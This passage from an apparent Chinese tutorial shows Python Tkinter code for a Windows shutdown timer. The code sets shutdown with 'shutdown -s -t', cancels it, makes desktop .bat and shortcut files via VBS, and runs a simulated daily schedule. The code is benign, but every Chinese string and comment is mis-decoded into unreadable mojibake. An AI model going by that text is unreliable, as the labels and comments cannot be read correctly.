        self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        create_btn = ttk.Button(button_frame, text=<span class="hljs-string">"åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"</span>, 
                               command=self.create_shortcut, style=<span class="hljs-string">'Large.TButton'</span>)
        create_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        test_btn = ttk.Button(button_frame, text=<span class="hljs-string">"æµ‹è¯•æ­¤æ—¶é—´è®¾ç½®"</span>, 
                             command=self.test_shortcut_time, style=<span class="hljs-string">'Large.TButton'</span>)
        test_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># ç»‘å®šå˜é‡å˜åŒ–äº‹ä»¶</span>
        self.shortcut_hours.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        self.shortcut_minutes.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method3_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸‰é€‰é¡¹å¡ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº\né€‚åˆè§„å¾‹æ€§å®šæ—¶å…³æœºéœ€æ±‚"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®</span>
        schedule_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å®šæ—¶è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        schedule_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´é€‰æ‹©</span>
        time_frame = ttk.Frame(schedule_frame)
        time_frame.pack(pady=<span class="hljs-number">15</span>, anchor=<span class="hljs-string">'center'</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"æ¯å¤©å…³æœºæ—¶é—´ï¼š"</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>)).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_hour = tk.StringVar(value=<span class="hljs-string">"22"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.schedule_hour)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">":"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_minute = tk.StringVar(value=<span class="hljs-string">"00"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.schedule_minute)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># ä»»åŠ¡çŠ¶æ€æ˜¾ç¤º</span>
        self.task_status_var = tk.StringVar(value=<span class="hljs-string">"å½“å‰æ— å®šæ—¶ä»»åŠ¡"</span>)
        status_label = ttk.Label(schedule_frame, textvariable=self.task_status_var,
                                font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        status_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># è®¡ç®—ä¸‹æ¬¡å…³æœºæ—¶é—´</span>
        self.next_time_var = tk.StringVar()
        next_time_label = ttk.Label(schedule_frame, textvariable=self.next_time_var,
                                   font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        next_time_label.pack(pady=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># æ¨¡æ‹Ÿä»»åŠ¡åŒºåŸŸ</span>
        sim_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"æ¨¡æ‹Ÿä»»åŠ¡ç®¡ç†"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        sim_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        sim_desc = <span class="hljs-string">"""æ³¨æ„ï¼šè¿™æ˜¯ç®€åŒ–ç‰ˆæ¨¡æ‹Ÿå®šæ—¶ä»»åŠ¡ã€‚
çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œå¤æ‚é…ç½®ã€‚
æœ¬ç¨‹åºä½¿ç”¨Pythonçº¿ç¨‹æ¨¡æ‹Ÿå®šæ—¶åŠŸèƒ½ã€‚"""</span>
        sim_label = ttk.Label(sim_frame, text=sim_desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        sim_label.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.schedule_btn = ttk.Button(button_frame, text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>, 
                                      command=self.toggle_schedule, style=<span class="hljs-string">'Large.TButton'</span>)
        self.schedule_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        ttk.Button(button_frame, text=<span class="hljs-string">"ç«‹å³æµ‹è¯•å…³æœº"</span>, 
                  command=self.test_schedule_shutdown, style=<span class="hljs-string">'Large.TButton'</span>).pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_status_bar</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºçŠ¶æ€æ """</span>
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill=<span class="hljs-string">'x'</span>, side=<span class="hljs-string">'bottom'</span>, pady=<span class="hljs-number">5</span>)
        
        self.status_var = tk.StringVar(value=<span class="hljs-string">"å°±ç»ª"</span>)
        status_label = ttk.Label(status_frame, textvariable=self.status_var, 
                                relief=<span class="hljs-string">'sunken'</span>, anchor=<span class="hljs-string">'w'</span>)
        status_label.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">10</span>, pady=<span class="hljs-number">2</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_custom_time</span>(<span class="hljs-params">self, seconds</span>):
        <span class="hljs-string">"""è®¾ç½®è‡ªå®šä¹‰æ—¶é—´åˆ°è¾“å…¥æ¡†"""</span>
        hours = seconds // <span class="hljs-number">3600</span>
        minutes = (seconds % <span class="hljs-number">3600</span>) // <span class="hljs-number">60</span>
        
        self.hour_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(hours))
        self.minute_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(minutes))
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_command_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å‘½ä»¤é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
        <span class="hljs-keyword">except</span> ValueError:
            self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_shortcut_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                content = <span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>
                self.shortcut_content.config(state=<span class="hljs-string">'normal'</span>)
                self.shortcut_content.delete(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">'end'</span>)
                self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, content)
                self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        <span class="hljs-keyword">except</span> ValueError:
            <span class="hljs-keyword">pass</span>
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡Œæ–¹æ³•ä¸€ï¼šè®¾ç½®å…³æœºå‘½ä»¤"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># æ‰§è¡Œå…³æœºå‘½ä»¤</span>
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># è®¡ç®—å…³æœºæ—¶é—´</span>
            shutdown_time = datetime.now() + timedelta(seconds=seconds)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å®šæ—¶å…³æœºå·²è®¾ç½®ï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"é¢„è®¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{shutdown_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>\n\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆï¼Œè¯·ä½¿ç”¨å–æ¶ˆæŒ‰é’®æˆ–è¿è¡Œå‘½ä»¤ï¼šshutdown -a"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å·²è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
        <span class="hljs-keyword">except</span> ValueError:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"è®¾ç½®å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cancel_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å–æ¶ˆå®šæ—¶å…³æœº"""</span>
        <span class="hljs-keyword">try</span>:
            subprocess.run(<span class="hljs-string">"shutdown -a"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, <span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"å–æ¶ˆå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_shortcut</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># è·å–æ¡Œé¢è·¯å¾„</span>
            desktop_path = os.path.join(os.path.expanduser(<span class="hljs-string">'~'</span>), <span class="hljs-string">'Desktop'</span>)
            
            <span class="hljs-comment"># è®¡ç®—ç§’æ•°</span>
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># åˆ›å»ºæ‰¹å¤„ç†æ–‡ä»¶</span>
            bat_content = <span class="hljs-string">f"""@echo off
echo æ­£åœ¨è®¾ç½®å®šæ—¶å…³æœº...
echo ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­
shutdown -s -t <span class="hljs-subst">{seconds}</span>
pause
"""</span>
            
            <span class="hljs-comment"># åˆ›å»ºå¿«æ·æ–¹å¼å†…å®¹ï¼ˆVBSè„šæœ¬ï¼‰</span>
            shortcut_name = self.shortcut_name.get() <span class="hljs-keyword">or</span> <span class="hljs-string">"å®šæ—¶å…³æœº"</span>
            bat_filename = <span class="hljs-string">f"<span class="hljs-subst">{shortcut_name}</span>.bat"</span>
            bat_path = os.path.join(desktop_path, bat_filename)
            
            vbs_content = <span class="hljs-string">f"""Set WshShell = CreateObject("WScript.Shell")
Set oShellLink = WshShell.CreateShortcut("<span class="hljs-subst">{desktop_path}</span>\\<span class="hljs-subst">{shortcut_name}</span>.lnk")
oShellLink.TargetPath = "<span class="hljs-subst">{bat_path}</span>"
oShellLink.WindowStyle = 1
oShellLink.Description = "å®šæ—¶å…³æœºå¿«æ·æ–¹å¼"
oShellLink.Save
"""</span>
            
            <span class="hljs-comment"># ä¿å­˜æ‰¹å¤„ç†æ–‡ä»¶</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(bat_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(bat_content)
                
            <span class="hljs-comment"># ä¿å­˜VBSè„šæœ¬å¹¶åˆ›å»ºå¿«æ·æ–¹å¼</span>
            vbs_path = os.path.join(desktop_path, <span class="hljs-string">"create_shortcut.vbs"</span>)
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(vbs_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(vbs_content)
                
            subprocess.run(<span class="hljs-string">f'cscript //nologo "<span class="hljs-subst">{vbs_path}</span>"'</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
            os.remove(vbs_path)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºåˆ°æ¡Œé¢ï¼\n"</span>
                <span class="hljs-string">f"æ–‡ä»¶åï¼š<span class="hljs-subst">{shortcut_name}</span>.lnk\n"</span>
                <span class="hljs-string">f"åŒå‡»å³å¯è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºï¼š<span class="hljs-subst">{shortcut_name}</span>"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"åˆ›å»ºå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_shortcut_time</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å¿«æ·æ–¹å¼è®¾ç½®çš„å…³æœºæ—¶é—´"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å·²è®¾ç½®æµ‹è¯•å…³æœºï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"æµ‹è¯•å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toggle_schedule</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                hour = <span class="hljs-built_in">int</span>(self.schedule_hour.get() <span class="hljs-keyword">or</span> <span class="hljs-number">22</span>)
                minute = <span class="hljs-built_in">int</span>(self.schedule_minute.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
                
                <span class="hljs-keyword">if</span> hour &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> hour &gt; <span class="hljs-number">23</span> <span class="hljs-keyword">or</span> minute &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> minute &gt; <span class="hljs-number">59</span>:
                    messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ—¶é—´"</span>)
                    <span class="hljs-keyword">return</span>
                    
                <span class="hljs-comment"># å¯åŠ¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
                self.shutdown_thread = threading.Thread(
                    target=self.schedule_shutdown_task,
                    args=(hour, minute),
                    daemon=<span class="hljs-literal">True</span>
                )
                self.shutdown_thread.start()
                
                self.is_scheduled = <span class="hljs-literal">True</span>
                self.schedule_btn.config(text=<span class="hljs-string">"åœæ­¢å®šæ—¶ä»»åŠ¡"</span>)
                
                <span class="hljs-comment"># æ›´æ–°çŠ¶æ€æ˜¾ç¤º</span>
                now = datetime.now()
                target_time = datetime(now.year, now.month, now.day, hour, minute)
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                    
                self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨"</span>)
                self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"ä¸‹æ¬¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{target_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M'</span>)}</span>"</span>)
                
                messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                    <span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼\n"</span>
                    <span class="hljs-string">f"æ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span> è‡ªåŠ¨å…³æœº\n"</span>
                    <span class="hljs-string">f"æ³¨æ„ï¼šè¿™æ˜¯ç¨‹åºæ¨¡æ‹Ÿçš„å®šæ—¶ä»»åŠ¡ï¼Œå…³é—­æœ¬ç¨‹åºå°†åœæ­¢"</span>)
                
                self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼šæ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span>"</span>)
                
            <span class="hljs-keyword">except</span> ValueError:
                messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># åœæ­¢å®šæ—¶ä»»åŠ¡</span>
            self.is_scheduled = <span class="hljs-literal">False</span>
            self.schedule_btn.config(text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>)
            self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">""</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">schedule_shutdown_task</span>(<span class="hljs-params">self, target_hour, target_minute</span>):
        <span class="hljs-string">"""å®šæ—¶ä»»åŠ¡çº¿ç¨‹å‡½æ•°"""</span>
        <span class="hljs-keyword">while</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                now = datetime.now()
                
                <span class="hljs-comment"># è®¡ç®—ä»Šå¤©çš„ç›®æ ‡æ—¶é—´</span>
                target_time = datetime(now.year, now.month, now.day, target_hour, target_minute)
                
                <span class="hljs-comment"># å¦‚æœä»Šå¤©çš„æ—¶é—´å·²è¿‡ï¼Œè®¾ç½®ä¸ºæ˜å¤©</span>
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                
                <span class="hljs-comment"># è®¡ç®—ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰</span>
                wait_seconds = (target_time - now).total_seconds()
                
                <span class="hljs-comment"># æ¯éš”10ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œä»¥ä¾¿åŠæ—¶å“åº”åœæ­¢å‘½ä»¤</span>
                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(wait_seconds / <span class="hljs-number">10</span>)):
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
                        <span class="hljs-keyword">return</span>
                    time.sleep(<span class="hljs-number">10</span>)
                
                <span class="hljs-comment"># ç­‰å¾…å‰©ä½™æ—¶é—´</span>
                remaining = wait_seconds % <span class="hljs-number">10</span>
                <span class="hljs-keyword">if</span> remaining &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self.is_scheduled:
                    time.sleep(remaining)
                
                <span class="hljs-comment"># æ‰§è¡Œå…³æœº</span>
                <span class="hljs-keyword">if</span> self.is_scheduled:
                    subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
                    
                    <span class="hljs-comment"># æ›´æ–°çŠ¶æ€</span>
                    self.root.after(<span class="hljs-number">0</span>, <span class="hljs-keyword">lambda</span>: self.task_status_var.<span class="hljs-built_in">set</span>(
                        <span class="hljs-string">f"å·²æ‰§è¡Œå…³æœºå‘½ä»¤ï¼ä¸‹æ¬¡å°†åœ¨æ˜å¤© <span class="hljs-subst">{target_hour:02d}</span>:<span class="hljs-subst">{target_minute:02d}</span>"</span>))
                    
                    <span class="hljs-comment"># é‡ç½®ä¸ºæ˜å¤©</span>
                    time.sleep(<span class="hljs-number">65</span>)  <span class="hljs-comment"># ç­‰å¾…å…³æœºæ‰§è¡Œæ—¶é—´</span>
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡é”™è¯¯ï¼š<span class="hljs-subst">{e}</span>"</span>)
                <span class="hljs-keyword">break</span>
                
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_schedule_shutdown</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å®šæ—¶å…³æœºï¼ˆç«‹å³å…³æœºï¼Œä½†ç»™äºˆå–æ¶ˆæ—¶é—´ï¼‰"""</span>
        response = messagebox.askyesno(<span class="hljs-string">"ç¡®è®¤æµ‹è¯•"</span>, 
            <span class="hljs-string">"å°†è®¾ç½®60ç§’åå…³æœºè¿›è¡Œæµ‹è¯•\nè¯·ç¡®ä¿å·²ä¿å­˜æ‰€æœ‰å·¥ä½œ\n\næ˜¯å¦ç»§ç»­ï¼Ÿ"</span>)
        
        <span class="hljs-keyword">if</span> response:
            subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•å¼€å§‹"</span>, 
                <span class="hljs-string">"å·²è®¾ç½®60ç§’åå…³æœº\n"</span>
                <span class="hljs-string">"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"æµ‹è¯•å…³æœºå·²è®¾ç½®ï¼š60ç§’åå…³é—­"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    root = tk.Tk()
    app = ShutdownTimerApp(root)
    root.mainloop()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<h3 data-id="heading-6">åŠŸèƒ½è¯´æ˜</h3>
<h4 data-id="heading-7">æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®</h4>
<ul>
<li>æä¾›é¢„è®¾æ—¶é—´æŒ‰é’®ï¼ˆ5åˆ†é’Ÿã€30åˆ†é’Ÿã€1å°æ—¶ç­‰ï¼‰</li>
<li>æ”¯æŒè‡ªå®šä¹‰å°æ—¶å’Œåˆ†é’Ÿè®¾ç½®</li>
<li>å®æ—¶æ˜¾ç¤ºå°†è¦æ‰§è¡Œçš„å‘½ä»¤</li>
